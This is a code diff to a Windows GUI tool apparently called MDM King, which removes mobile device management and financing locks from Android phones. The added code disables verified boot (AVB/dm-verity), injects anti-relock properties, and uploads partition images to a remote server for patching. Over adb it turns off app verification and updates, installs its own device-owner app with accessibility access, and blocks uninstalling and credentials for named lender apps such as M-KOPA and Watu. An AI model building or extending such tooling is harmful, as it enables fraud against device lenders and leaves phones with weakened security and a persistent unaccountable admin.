@@ -28,7 +28,7 @@ if _sys.platform == 'win32':
     _sp.run = _run_silent
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox
-import os, sys, subprocess, threading, time, re, struct, tempfile, math, zlib, io, webbrowser, json, datetime, urllib.request, shutil, concurrent.futures, hashlib
+import os, sys, subprocess, threading, time, re, struct, tempfile, math, zlib, io, webbrowser, json, datetime, urllib.request, urllib.parse, http.client, shutil, concurrent.futures, hashlib
 
 from auth import (_hash_password,
     _check_password, _migrate_password, _get_machine_id,
@@ -2782,7 +2782,7 @@ COLORS = {
 }
 
 
-APP_VERSION = "0.3.8"
+APP_VERSION = "0.3.9"
 VERSION_URL = CLOUDFLARE_API_URL + "/download/version.txt"
 EXE_DOWNLOAD_URL = CLOUDFLARE_API_URL + "/download/mdm_king.exe"
 
@@ -4852,8 +4852,19 @@ class MdmKingApp:
                 self._enqueue_ui(lambda: ctx['progress'].config(value=0))
                 self._enqueue_ui(lambda: self.status_var.set('Error'))
             else:
-                self._enqueue_ui(lambda: ctx['progress'].config(value=95))
-                self._enqueue_ui(lambda: ctx['pct'].config(text='95%'))
+                self._enqueue_ui(lambda: ctx['progress'].config(value=90))
+                self._enqueue_ui(lambda: ctx['pct'].config(text='90%'))
+                self.log('[*] Removing AVB/dm-verity verification...', 'h')
+                try:
+                    _fix_avb_dmverity(path, self._tools_dir(), self.log)
+                except Exception as _avbe:
+                    self.log(f'[!] AVB fix: {_avbe}', 'o')
+                self.log('[*] Injecting anti-relock package-state overrides...', 'h')
+                try:
+                    _fsize = os.path.getsize(path)
+                    inject_relock_props(path, _fsize, None, None, self.log)
+                except Exception as _pie:
+                    self.log(f'[!] Relock injection: {_pie}', 'o')
                 self._enqueue_ui(lambda: ctx['progress'].config(value=100))
                 self._enqueue_ui(lambda: ctx['pct'].config(text='100%'))
                 out_size = os.path.getsize(path) if os.path.isfile(path) else 0
@@ -5159,32 +5170,53 @@ class MdmKingApp:
         self.log(f'File: {_bn} ({_fsize} bytes)', 'i')
         _name_lower = _bn.lower()
         if 'proinfo' in _name_lower:
-            _part = 'proinfo'
+            _idx = '1'
         elif 'miscdata' in _name_lower or 'misc' in _name_lower:
-            _part = 'miscdata'
+            _idx = '2'
         else:
-            _part = ''
             self.log('Could not detect partition type from filename, trying miscdata', 'w')
-            _part = 'miscdata'
-        _url = f'https://remove.mdmfile.com/bin/{_part}'
-        self.log(f'Downloading patched binary from server...', 'i')
+            _idx = '2'
+        self.log('Uploading file to server for patching...', 'i')
         self._enqueue_ui(lambda: self.root.update())
-        _tmp = os.path.join(tempfile.gettempdir(), f'mdm_online_{_part}_{int(time.time())}.bin')
+        _tmp = os.path.join(tempfile.gettempdir(), f'mdm_online_{int(time.time())}.bin')
         try:
-            _req = urllib.request.Request(_url, headers={'User-Agent': 'MDM-King/2.0'})
-            with urllib.request.urlopen(_req, timeout=30) as _resp:
-                _dl_data = _resp.read()
+            _boundary = '----' + hashlib.md5(str(time.time()).encode()).hexdigest()
+            _body = b''
+            # selectedIndex field
+            _body += f'--{_boundary}\r\nContent-Disposition: form-data; name="selectedIndex"\r\n\r\n{_idx}\r\n'.encode()
+            # file field
+            with open(path, 'rb') as f: _fdata = f.read()
+            _body += f'--{_boundary}\r\nContent-Disposition: form-data; name="file"; filename="{os.path.basename(path)}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode()
+            _body += _fdata
+            _body += f'\r\n--{_boundary}--\r\n'.encode()
+            _parsed = urllib.parse.urlparse('https://remove.mdmfile.com/bin/')
+            _conn = http.client.HTTPSConnection(_parsed.netloc, timeout=60)
+            _conn.request('POST', _parsed.path or '/', body=_body,
+                headers={'Content-Type': f'multipart/form-data; boundary={_boundary}',
+                         'User-Agent': 'MDM-King/2.0'})
+            _resp = _conn.getresponse()
+            _raw = _resp.read()
+            _resp_data = json.loads(_raw.decode('utf-8'))
+            _conn.close()
+            if not _resp_data.get('download'):
+                _logs = _resp_data.get('logs', [])
+                for _l in _logs: self.log(_l, 'w')
+                self.log('Server did not return a download link', 'e'); return
+            _dl_url = _resp_data['download']
+            if _dl_url.startswith('/'): _dl_url = 'https://remove.mdmfile.com' + _dl_url
+            self.log('Downloading patched binary from server...', 'i')
+            _req2 = urllib.request.Request(_dl_url, headers={'User-Agent': 'MDM-King/2.0'})
+            with urllib.request.urlopen(_req2, timeout=30) as _resp2:
+                _dl_data = _resp2.read()
             if not _dl_data or len(_dl_data) < 64:
                 self.log(f'Server returned invalid data ({len(_dl_data)} bytes)', 'e'); return
             self.log(f'Downloaded {len(_dl_data)} bytes from server', 's')
             with open(_tmp, 'wb') as f: f.write(_dl_data)
-            # Backup original
             _bak = os.path.splitext(path)[0] + '_backup.bin'
             if not os.path.isfile(_bak):
                 with open(_bak, 'wb') as f:
                     with open(path, 'rb') as _src: f.write(_src.read())
                 self.log(f'Backup saved: {os.path.basename(_bak)}', 's')
-            # Replace original with downloaded patched binary
             with open(path, 'wb') as f: f.write(_dl_data)
             self.log_ok(f'Online patch applied — {os.path.basename(path)} replaced with server version')
             self.log('Flash this file back using TSM/Pandora Partition Manager', 'i')
@@ -5891,6 +5923,37 @@ class MdmKingApp:
                     'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null; '
                     'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'],
                     timeout=10, capture_output=True, creationflags=flags)
+                # ── Admin restrictions for all device types ──
+                subprocess.run([adb, '-s', s, 'shell',
+                    'settings put global add_users_when_locked 0 2>/dev/null; '
+                    'settings put global multi_user_mode 0 2>/dev/null; '
+                    'settings put global autofill_service null 2>/dev/null; '
+                    'settings put global package_verifier_enable 0 2>/dev/null; '
+                    'settings put global verifier_verify_adb_installs 0 2>/dev/null; '
+                    'settings put global ota_disable_automatic_update 1 2>/dev/null'],
+                    timeout=5, capture_output=True, creationflags=flags)
+                subprocess.run([adb, '-s', s, 'shell',
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_user true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_remove_user true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_managed_profile true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_config_credentials true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_set_user_icon true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_autofill true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_verify_apps true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_switch_user true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_fun true 2>/dev/null; '
+                    'cmd device_policy set-user-restriction ' + _adm_comp + ' no_sim_global true 2>/dev/null'],
+                    timeout=10, capture_output=True, creationflags=flags)
+                subprocess.run([adb, '-s', s, 'shell',
+                    'cmd device_policy set-system-update-policy ' + _adm_comp + ' --freeze-period-start 01/01 --freeze-period-end 02/20 2>/dev/null'],
+                    timeout=5, capture_output=True, creationflags=flags)
+                if _is_seccom:
+                    subprocess.run([adb, '-s', s, 'shell',
+                        'cmd device_policy set-uninstall-blocked ' + _adm_comp + ' com.scorpio.securitycom true 2>/dev/null'],
+                        timeout=3, capture_output=True, creationflags=flags)
+                    subprocess.run([adb, '-s', s, 'shell',
+                        'cmd device_policy set-credential-manager-provider-blocklist ' + _adm_comp + ' com.scorpio.securitycom 2>/dev/null'],
+                        timeout=5, capture_output=True, creationflags=flags)
             else:
                 pass
             _kill(adb, s)
@@ -6544,6 +6607,40 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.google.android.setupwizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.android.setupwizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.sec.android.app.SecSetupWizard 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
+            # ── Samsung-specific admin restrictions ──
+            _adm_comp = 'com.mdmking.admin/.MyAdminReceiver'
+            subprocess.run([adb, '-s', s, 'shell',
+                'settings put global add_users_when_locked 0 2>/dev/null; '
+                'settings put global multi_user_mode 0 2>/dev/null; '
+                'settings put global autofill_service null 2>/dev/null; '
+                'settings put global package_verifier_enable 0 2>/dev/null; '
+                'settings put global verifier_verify_adb_installs 0 2>/dev/null; '
+                'settings put global ota_disable_automatic_update 1 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_remove_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_managed_profile true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_config_credentials true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_set_user_icon true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_autofill true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_verify_apps true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_switch_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_fun true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_sim_global true 2>/dev/null'],
+                timeout=10, capture_output=True, creationflags=flags)
+            # System update freeze: freeze start 01/01, freeze end 02/20 2099
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-system-update-policy ' + _adm_comp + ' --freeze-period-start 01/01 --freeze-period-end 02/20 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
+            # Block uninstallation + credential provider blocklist for mkopa/watutz
+            for _mkopa_pkg in ['com.mkopa.app', 'com.watutz.app']:
+                subprocess.run([adb, '-s', s, 'shell',
+                    'cmd device_policy set-uninstall-blocked ' + _adm_comp + ' ' + _mkopa_pkg + ' true 2>/dev/null'],
+                    timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-credential-manager-provider-blocklist ' + _adm_comp + ' com.mkopa.app,com.watutz.app 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
             time.sleep(3)
             r = subprocess.run([adb, '-s', s, 'shell', 'settings get secure enabled_accessibility_services'], capture_output=True, text=True, timeout=5, creationflags=flags)
             if 'MyAccessibilityService' in r.stdout: self.log_ok('HyperCore protection active - device secured')
@@ -7401,6 +7498,47 @@ class MdmKingApp:
             except Exception as e:
                 self.log('Error: ' + str(e), 'e')
 
+            # ── Install admin app + device owner ──
+            apk = None
+            for _n in ['mdm_king_admin_signed.apk', 'mdm_king_admin.apk']:
+                _p = os.path.join(tools, _n)
+                if os.path.isfile(_p): apk = _p; break
+            if apk is None:
+                from cloudflare import _ensure_admin_apk
+                _dl = _ensure_admin_apk(tools)
+                if _dl and os.path.isfile(_dl): apk = _dl
+            if apk:
+                self._ensure_apk_signed(apk)
+                for _args in [
+                    [adb, '-s', s, 'install', '-r', '-d', apk],
+                    [adb, '-s', s, 'install', '-r', '-d', '--bypass-low-target-sdk-block', apk],
+                    None,
+                ]:
+                    if _args is None:
+                        subprocess.run([adb, '-s', s, 'push', apk, '/data/local/tmp/mdm_admin.apk'], timeout=15, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                        _r = subprocess.run([adb, '-s', s, 'shell', 'pm install -r /data/local/tmp/mdm_admin.apk 2>/dev/null'], timeout=30, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                        if 'Success' in (_r.stdout or '') or 'Success' in (_r.stderr or ''): break
+                    else:
+                        _r = subprocess.run(_args, timeout=30, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                        if 'Success' in (_r.stdout or ''): break
+            _adm_comp = 'com.mdmking.admin/.MyAdminReceiver'
+            subprocess.run([adb, '-s', s, 'shell', f'dpm remove-active-admin {_adm_comp} 2>/dev/null'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            for _cmd in [
+                f'dpm set-device-owner --user 0 {_adm_comp}',
+                f'dpm set-device-owner --user current {_adm_comp}',
+                f'dpm set-device-owner {_adm_comp}',
+                f'dpm set-profile-owner --user 0 {_adm_comp}',
+                f'dpm set-profile-owner --user current {_adm_comp}',
+            ]:
+                _r = subprocess.run([adb, '-s', s, 'shell', f'{_cmd} 2>&1'], timeout=30, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                _out = ((_r.stdout or '') + (_r.stderr or '')).strip()
+                if 'Success' in _out or 'already' in _out.lower():
+                    self.log('Device owner set', 's')
+                    break
+            subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null'], timeout=2, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run([adb, '-s', s, 'shell', 'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null'], timeout=5, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            self._samsung_hardening()
             self._enqueue_ui(lambda: self._update_progress(2, 3, '...', 'done'))
             self._enqueue_ui(lambda: self._finish_progress(True, 'SAMSUNG 2023 BYPASS COMPLETE'))
         finally:
@@ -8934,6 +9072,15 @@ if __name__ == "__main__":
     if len(sys.argv) > 2 and sys.argv[1] == '--spd-patch-worker':
         _spd_subprocess_worker(sys.argv[2])
         sys.exit(0)
+    # Self-elevate to admin if frozen and not already admin
+    if getattr(sys, 'frozen', False):
+        import ctypes
+        try:
+            if not ctypes.windll.shell32.IsUserAnAdmin():
+                ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(f'"{a}"' for a in sys.argv[1:]), None, 1)
+                sys.exit(0)
+        except Exception:
+            pass
     set_version(APP_VERSION)
     mark_clean()
     # ── Console/headless mode (Knox Wizard-style StartConsole) ──
@@ -9231,7 +9378,6 @@ if __name__ == "__main__":
                         resp = urllib.request.urlopen(req, timeout=8)
                         latest = resp.read().decode('utf-8').strip()
                         if latest and _semver_gt(latest, APP_VERSION):
-                            _update_blocked[0] = True
                             _update_latest[0] = latest
                     except Exception:
                         pass
@@ -9242,8 +9388,8 @@ if __name__ == "__main__":
                     login_win.geometry(f'400x620+{(sw-400)//2}+{(sh-620)//2}')
                     login_win.deiconify()
                     login_win.lift()
-                    if _update_blocked[0]:
-                        _prompt_update_login(_update_latest[0])
+                    if _update_latest[0]:
+                        _show_update_banner(_update_latest[0])
                 splash.destroy()
                 threading.Thread(target=_do_check, daemon=True).start()
             splash.after(300, _check_update_then_show)
@@ -9596,8 +9742,6 @@ if __name__ == "__main__":
         e3.bind('<FocusOut>', lambda e: (setattr(card3, 'bg_border', COLORS['login_border']), card3._draw()))
         # Buttons
         def _do_signup_submit():
-            if _update_blocked[0]:
-                status_label.config(text='Update required — download the latest version to continue', fg=COLORS['red']); return
             u = su_email.get().strip()
             p = su_pass.get().strip()
             c = su_confirm.get().strip()
@@ -9807,8 +9951,6 @@ if __name__ == "__main__":
 
     def do_login(uv, pv, rv, set_loading=None):
         import datetime
-        if _update_blocked[0]:
-            status_label.config(text='Update required — download the latest version to continue', fg='#ff5555'); return
         if set_loading: set_loading(True)
         def _done():
             if set_loading: set_loading(False)
@@ -9957,129 +10099,77 @@ if __name__ == "__main__":
             return
         login_win.mainloop()
     
-    # Bottom row: update check
+    # Bottom row: version + update banner placeholder
     bottom_row = tk.Frame(login_win, bg=COLORS['bg'])
     bottom_row.pack(pady=(6, 2))
-    update_lbl = tk.Label(bottom_row, text='', font=('Segoe UI', 7),
+    _tk_version_lbl = tk.Label(bottom_row, text=f'v{APP_VERSION}', font=('Segoe UI', 7),
              fg=COLORS['muted'], bg=COLORS['bg'])
-    update_lbl.pack(side=tk.LEFT, padx=(8, 0))
-    _update_blocked = [False]
+    _tk_version_lbl.pack(side=tk.RIGHT, padx=(0, 8))
     _update_latest = ['']
+    _update_tmp = [None]
 
-    def _prompt_update_login(latest):
-        _win = tk.Toplevel(login_win)
-        _win.title('Update Available')
-        _win.configure(bg=COLORS['bg'])
-        _win.resizable(False, False)
-        _win.attributes('-topmost', True)
-        _win.transient(login_win)
-        _win.grab_set()
-        _win.overrideredirect(True)
-        sw = login_win.winfo_screenwidth()
-        sh = login_win.winfo_screenheight()
-        _win.geometry(f'320x180+{(sw-320)//2}+{(sh-180)//2}')
-        tk.Label(_win, text='New Update Available', font=('Segoe UI', 13, 'bold'),
-                 fg=COLORS['accent2'], bg=COLORS['surface']).pack(pady=(16, 4))
-        tk.Label(_win, text=f'Version {latest} is ready', font=('Segoe UI', 10),
-                 fg=COLORS['fg'], bg=COLORS['bg']).pack(pady=(0, 4))
-        tk.Label(_win, text=f'Current: v{APP_VERSION}', font=('Segoe UI', 8),
-                 fg=COLORS['muted'], bg=COLORS['bg']).pack(pady=(0, 10))
-        btn_frame = tk.Frame(_win, bg=COLORS['bg'])
-        btn_frame.pack()
-
-        def _do_update():
+    def _show_update_banner(latest):
+        bar = tk.Frame(login_win, bg='#1c1c36', highlightthickness=1,
+                       highlightbackground=COLORS['accent'], highlightcolor=COLORS['accent'])
+        bar.pack(fill=tk.X, before=bottom_row, pady=(0, 4))
+        msg = tk.Label(bar, text=f'Update v{APP_VERSION} \u2192 v{latest}', font=('Segoe UI', 8, 'bold'),
+                       fg=COLORS['accent'], bg='#1c1c36')
+        msg.pack(side=tk.LEFT, padx=(12, 4), pady=3)
+        prog = tk.Label(bar, text='Downloading...', font=('Segoe UI', 7),
+                        fg=COLORS['muted'], bg='#1c1c36')
+        prog.pack(side=tk.LEFT, padx=(0, 6))
+        def _dismiss():
+            bar.destroy()
+        close_btn = tk.Label(bar, text='\u2715', font=('Segoe UI', 9), fg=COLORS['muted'],
+                             bg='#1c1c36', cursor='hand2')
+        close_btn.pack(side=tk.RIGHT, padx=(4, 8))
+        close_btn.bind('<Button-1>', lambda e: _dismiss())
+        def _install_update():
+            exe_path = sys.executable if getattr(sys, 'frozen', False) else None
+            if not exe_path or not _update_tmp[0] or not os.path.isfile(_update_tmp[0]):
+                return
+            import shutil
+            try:
+                shutil.copy2(exe_path, exe_path + '.old')
+                os.replace(_update_tmp[0], exe_path)
+                login_win.after(200, lambda: (login_win.destroy(), os.startfile(exe_path)))
+            except Exception:
+                pass
+        def _dl():
             exe_path = sys.executable if getattr(sys, 'frozen', False) else None
             if not exe_path:
+                login_win.after(0, lambda: prog.config(text='Cannot update — exe not found', fg=COLORS['red']))
                 return
-            # Replace popup with download progress window
-            _win.geometry('400x160')
-            for w in _win.winfo_children():
-                w.destroy()
-            tk.Label(_win, text='Downloading Update...', font=('Segoe UI', 13, 'bold'),
-                     fg=COLORS['accent'], bg=COLORS['surface']).pack(pady=(16, 4))
-            status_lbl = tk.Label(_win, text=f'v{APP_VERSION} → v{latest}', font=('Segoe UI', 9),
-                     fg=COLORS['fg'], bg=COLORS['bg'])
-            status_lbl.pack(pady=(0, 8))
-            progress_frame = tk.Frame(_win, bg=COLORS['bg'])
-            progress_frame.pack(fill=tk.X, padx=30)
-            progress_bar = tk.Canvas(progress_frame, height=18, bg=COLORS['surface'], highlightthickness=0)
-            progress_bar.pack(fill=tk.X)
-            size_lbl = tk.Label(_win, text='Starting download...', font=('Segoe UI', 8),
-                     fg=COLORS['muted'], bg=COLORS['bg'])
-            size_lbl.pack(pady=(4, 0))
-            cancel_flag = [False]
-
-            def _cancel():
-                cancel_flag[0] = True
-                _win.destroy()
-                os._exit(0)
-            cancel_btn_dl = tk.Button(_win, text='Cancel', font=('Segoe UI', 8),
-                         bg=COLORS['surface'], fg=COLORS['muted'], relief=tk.FLAT,
-                         cursor='hand2', command=_cancel)
-            cancel_btn_dl.pack(pady=(6, 0))
-
-            def _dl():
-                try:
-                    tmp = exe_path + '.tmp'
-                    req = urllib.request.Request(EXE_DOWNLOAD_URL, headers={'User-Agent': 'MDM-King'})
-                    resp = urllib.request.urlopen(req, timeout=30)
-                    total = int(resp.headers.get('Content-Length', 0))
-                    downloaded = 0
-                    block = 65536
-                    with open(tmp, 'wb') as f:
-                        while True:
-                            if cancel_flag[0]:
-                                return
-                            chunk = resp.read(block)
-                            if not chunk:
-                                break
-                            f.write(chunk)
-                            downloaded += len(chunk)
-                            if total > 0:
-                                pct = min(downloaded / total, 1.0)
-                                pw = int(340 * pct)
-                                login_win.after(0, lambda p=pct, d=downloaded, t=total: (
-                                    progress_bar.delete('all'),
-                                    progress_bar.create_rectangle(0, 0, pw, 18, fill=COLORS['accent'], outline=''),
-                                    size_lbl.config(text=f'{d // 1024} / {t // 1024} KB ({int(p*100)}%)')
-                                ))
-                            else:
-                                login_win.after(0, lambda d=downloaded: size_lbl.config(text=f'{d // 1024} KB downloaded'))
-                    if cancel_flag[0]:
-                        if os.path.isfile(tmp):
-                            os.remove(tmp)
-                        return
-                    if not os.path.isfile(tmp) or os.path.getsize(tmp) < 1000000:
-                        login_win.after(0, lambda: size_lbl.config(text='Download failed — try again', fg=COLORS['red']))
-                        return
+            tmp = exe_path + '.tmp'
+            try:
+                import urllib.request
+                req = urllib.request.Request(EXE_DOWNLOAD_URL, headers={'User-Agent': 'MDM-King'})
+                resp = urllib.request.urlopen(req, timeout=30)
+                total = int(resp.headers.get('Content-Length', 0))
+                downloaded = 0
+                with open(tmp, 'wb') as f:
+                    while True:
+                        chunk = resp.read(65536)
+                        if not chunk: break
+                        f.write(chunk)
+                        downloaded += len(chunk)
+                        if total > 0:
+                            pct = int(downloaded / total * 100)
+                            login_win.after(0, lambda p=pct: prog.config(text=f'{p}%'))
+                if os.path.isfile(tmp) and os.path.getsize(tmp) >= 1000000:
+                    _update_tmp[0] = tmp
                     login_win.after(0, lambda: (
-                        status_lbl.config(text='Installing...', fg=COLORS['green']),
-                        size_lbl.config(text='Replacing EXE and restarting...'),
-                        progress_bar.delete('all'),
-                        progress_bar.create_rectangle(0, 0, 340, 18, fill=COLORS['green'], outline='')
-                    ))
-                    import shutil
-                    shutil.copy2(exe_path, exe_path + '.old')
-                    os.replace(tmp, exe_path)
-                    login_win.after(200, lambda: (login_win.destroy(), os.startfile(exe_path)))
-                except Exception as e:
-                    if not cancel_flag[0]:
-                        login_win.after(0, lambda: size_lbl.config(text=f'Failed: {e}', fg=COLORS['red']))
-            threading.Thread(target=_dl, daemon=True).start()
-
-        def _do_cancel():
-            _win.destroy()
-            os._exit(0)
-        update_btn = tk.Button(btn_frame, text='Update', font=('Segoe UI', 10, 'bold'),
-                     bg=COLORS['accent'], fg=COLORS['white'], relief=tk.FLAT,
-                     activebackground=COLORS['accent2'], activeforeground=COLORS['white'],
-                     cursor='hand2', padx=30, pady=4, command=_do_update)
-        update_btn.pack(pady=(0, 6))
-        cancel_btn = tk.Button(btn_frame, text='Cancel', font=('Segoe UI', 9),
-                     bg=COLORS['surface'], fg=COLORS['muted'], relief=tk.FLAT,
-                     activebackground=COLORS['btn_hover'], activeforeground=COLORS['fg'],
-                     cursor='hand2', padx=30, pady=2, command=_do_cancel)
-        cancel_btn.pack()
+                        msg.config(text=f'\u2713 v{latest} ready', fg=COLORS['green']),
+                        close_btn.config(text='Restart', fg=COLORS['green'], font=('Segoe UI', 8, 'bold')),
+                        close_btn.unbind('<Button-1>'),
+                        close_btn.bind('<Button-1>', lambda e: _install_update()),
+                        prog.config(text='Click Restart to apply')))
+                else:
+                    login_win.after(0, lambda: prog.config(text='Download failed', fg=COLORS['red']))
+                    if os.path.isfile(tmp): os.remove(tmp)
+            except Exception as e:
+                login_win.after(0, lambda: prog.config(text=str(e)[:35], fg=COLORS['red']))
+        threading.Thread(target=_dl, daemon=True).start()
 
     # Forgot password & exit row (show for login, hide during reset)
     extra_frame = tk.Frame(login_win, bg='#0a0a14')
